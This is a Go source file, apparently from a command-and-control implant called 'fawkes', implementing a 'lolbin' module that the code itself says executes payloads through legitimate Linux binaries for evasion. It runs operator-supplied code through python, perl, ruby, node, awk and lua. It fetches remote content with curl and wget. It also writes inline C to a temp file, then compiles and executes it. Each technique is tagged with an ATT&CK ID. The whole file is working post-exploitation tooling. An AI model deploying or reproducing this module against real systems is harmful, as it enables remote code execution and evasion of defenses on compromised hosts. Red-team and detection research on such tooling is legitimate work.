//go:build linux
// +build linux

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type LolbinCommand struct{}

func (c *LolbinCommand) Name() string {
	return "lolbin"
}

func (c *LolbinCommand) Description() string {
	return "GTFOBins — execute payloads through legitimate Linux binaries for evasion"
}

type lolbinArgs struct {
	Action string `json:"action"`
	Path   string `json:"path"`
	Export string `json:"export"`
	Args   string `json:"args"`
}

func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
	var args lolbinArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		return errorResult("Error: action is required (python, curl, wget, gcc, perl, ruby, node, awk)")
	}

	switch args.Action {
	case "python":
		return gtfobinPython(args.Path, args.Args)
	case "curl":
		return gtfobinCurl(args.Path, args.Args)
	case "wget":
		return gtfobinWget(args.Path, args.Args)
	case "gcc":
		return gtfobinGCC(args.Path, args.Args)
	case "perl":
		return gtfobinPerl(args.Path, args.Args)
	case "ruby":
		return gtfobinRuby(args.Path, args.Args)
	case "node":
		return gtfobinNode(args.Path, args.Args)
	case "awk":
		return gtfobinAwk(args.Path, args.Args)
	case "lua":
		return gtfobinLua(args.Path, args.Args)
	default:
		return errorf("Unknown action: %s (use python, curl, wget, gcc, perl, ruby, node, awk, lua)", args.Action)
	}
}

// findBinary searches for a binary by trying multiple names in order
func findBinary(names ...string) string {
	for _, name := range names {
		if path, err := exec.LookPath(name); err == nil {
			return path
		}
	}
	return ""
}

// runWithTimeout executes a command with timeout and returns formatted output
func runWithTimeout(binary string, cmdArgs []string) structs.CommandResult {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, binary, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", binary, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}
	return successResult(result)
}

// gtfobinPython — T1059.006 — Execute Python code inline or from file
func gtfobinPython(code, extraArgs string) structs.CommandResult {
	binary := findBinary("python3", "python")
	if binary == "" {
		return errorResult("Error: python3/python not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		// Inline execution: python3 -c "code"
		cmdArgs = []string{"-c", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		// Script file execution: python3 script.py [args]
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinCurl — T1105 — Download and optionally execute via curl
func gtfobinCurl(url, extraArgs string) structs.CommandResult {
	binary := findBinary("curl")
	if binary == "" {
		return errorResult("Error: curl not found on this system")
	}

	if url == "" {
		return errorResult("Error: URL is required in 'path' field")
	}

	var cmdArgs []string
	if extraArgs != "" {
		// Custom arguments: user controls the full curl invocation
		cmdArgs = append([]string{url}, strings.Fields(extraArgs)...)
	} else {
		// Default: silent download, output to stdout
		cmdArgs = []string{"-s", url}
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinWget — T1105 — Download and optionally execute via wget
func gtfobinWget(url, extraArgs string) structs.CommandResult {
	binary := findBinary("wget")
	if binary == "" {
		return errorResult("Error: wget not found on this system")
	}

	if url == "" {
		return errorResult("Error: URL is required in 'path' field")
	}

	var cmdArgs []string
	if extraArgs != "" {
		cmdArgs = append([]string{url}, strings.Fields(extraArgs)...)
	} else {
		// Default: quiet download, output to stdout
		cmdArgs = []string{"-q", "-O", "-", url}
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinGCC — T1027.004 — Compile and execute inline C code
func gtfobinGCC(code, extraArgs string) structs.CommandResult {
	binary := findBinary("gcc", "cc")
	if binary == "" {
		return errorResult("Error: gcc/cc not found on this system")
	}

	if code == "" {
		return errorResult("Error: C source code is required in 'path' field")
	}

	// Write source to temp file
	srcFile, err := os.CreateTemp("", "fawkes-*.c")
	if err != nil {
		return errorf("Error creating temp file: %v", err)
	}
	srcPath := srcFile.Name()
	defer os.Remove(srcPath)

	if _, err := srcFile.WriteString(code); err != nil {
		srcFile.Close()
		return errorf("Error writing source: %v", err)
	}
	srcFile.Close()

	// Compile
	outPath := strings.TrimSuffix(srcPath, ".c")
	defer os.Remove(outPath)

	compileArgs := []string{"-o", outPath, srcPath, "-w"}
	if extraArgs != "" {
		compileArgs = append(compileArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	compileCmd := exec.CommandContext(ctx, binary, compileArgs...)
	compileOut, err := compileCmd.CombinedOutput()
	if err != nil {
		result := fmt.Sprintf("[!] Compilation failed: %s %s\n%s\n%v",
			binary, strings.Join(compileArgs, " "), string(compileOut), err)
		return errorResult(result)
	}

	// Make executable and run
	os.Chmod(outPath, 0700)

	ctx2, cancel2 := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel2()

	runCmd := exec.CommandContext(ctx2, outPath)
	runOut, err := runCmd.CombinedOutput()

	result := fmt.Sprintf("[+] Compiled with %s, executing\n", binary)
	if len(runOut) > 0 {
		result += string(runOut)
	}
	if ctx2.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// gtfobinPerl — T1059 — Execute Perl code inline or from file
func gtfobinPerl(code, extraArgs string) structs.CommandResult {
	binary := findBinary("perl")
	if binary == "" {
		return errorResult("Error: perl not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		cmdArgs = []string{"-e", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinRuby — T1059 — Execute Ruby code inline or from file
func gtfobinRuby(code, extraArgs string) structs.CommandResult {
	binary := findBinary("ruby")
	if binary == "" {
		return errorResult("Error: ruby not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		cmdArgs = []string{"-e", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinNode — T1059.007 — Execute Node.js code inline or from file
func gtfobinNode(code, extraArgs string) structs.CommandResult {
	binary := findBinary("node", "nodejs")
	if binary == "" {
		return errorResult("Error: node/nodejs not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		cmdArgs = []string{"-e", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// gtfobinAwk — T1059 — Execute commands via awk
func gtfobinAwk(program, extraArgs string) structs.CommandResult {
	binary := findBinary("awk", "gawk", "mawk")
	if binary == "" {
		return errorResult("Error: awk not found on this system")
	}

	if program == "" {
		return errorResult("Error: awk program is required in 'path' field (e.g., 'BEGIN{system(\"id\")}')")
	}

	cmdArgs := []string{program}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	return runWithTimeout(binary, cmdArgs)
}

// lua — T1059 — Execute Lua script via lua interpreter
func gtfobinLua(scriptPath, extraArgs string) structs.CommandResult {
	binary := findBinary("lua", "lua5.4", "lua5.3", "lua5.1", "luajit")
	if binary == "" {
		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
	}

	cmdArgs := []string{scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	return runWithTimeout(binary, cmdArgs)
}
